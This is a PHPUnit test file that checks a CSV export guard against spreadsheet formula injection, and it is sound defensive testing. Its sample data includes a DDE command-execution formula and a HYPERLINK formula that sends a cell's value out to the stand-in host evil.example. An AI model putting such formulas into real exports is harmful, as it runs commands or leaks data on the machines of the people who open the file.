<?php

declare(strict_types=1);

namespace AccountCheck\Tests\Unit;

use AccountCheck\Support\Csv;
use PHPUnit\Framework\TestCase;

/**
 * CSV writing, and the formula-injection guard in particular.
 *
 * An export is a file somebody opens in Excel. A cell beginning = + - or @ is
 * treated as a formula there, so a value a user chose could run when their
 * colleague opens the file. The guard prefixes such a cell so it stays text.
 */
final class CsvTest extends TestCase
{
    /** @dataProvider dangerousCells */
    public function test_a_cell_that_would_be_read_as_a_formula_is_neutralised(string $input): void
    {
        $guarded = Csv::guard($input);

        self::assertStringStartsWith("'", $guarded, 'A formula-leading cell must be prefixed.');
        self::assertSame($input, substr($guarded, 1), 'The value itself must survive intact.');
    }

    /** @return array<string, array{string}> */
    public static function dangerousCells(): array
    {
        return [
            'equals' => ['=1+1'],
            'plus' => ['+1+1'],
            'minus' => ['-1+1'],
            'at sign' => ['@SUM(A1)'],
            'command execution attempt' => ['=cmd|\' /c calc\'!A0'],
            'hyperlink exfiltration attempt' => ['=HYPERLINK("http://evil.example?v="&A1,"click")'],
        ];
    }

    public function test_an_ordinary_value_is_left_alone(): void
    {
        foreach (['someone@example.com', 'a handle', '2026-01-01', '42', ''] as $value) {
            self::assertSame($value, Csv::guard($value));
        }
    }

    public function test_control_characters_are_stripped(): void
    {
        self::assertSame('clean', Csv::guard("cl\x01ea\x07n"));
    }

    public function test_a_value_that_becomes_a_formula_after_stripping_is_still_guarded(): void
    {
        // The control character would otherwise hide the leading = from the
        // check while the spreadsheet ignores it.
        self::assertSame("'=1+1", Csv::guard("\x01=1+1"));
    }
}
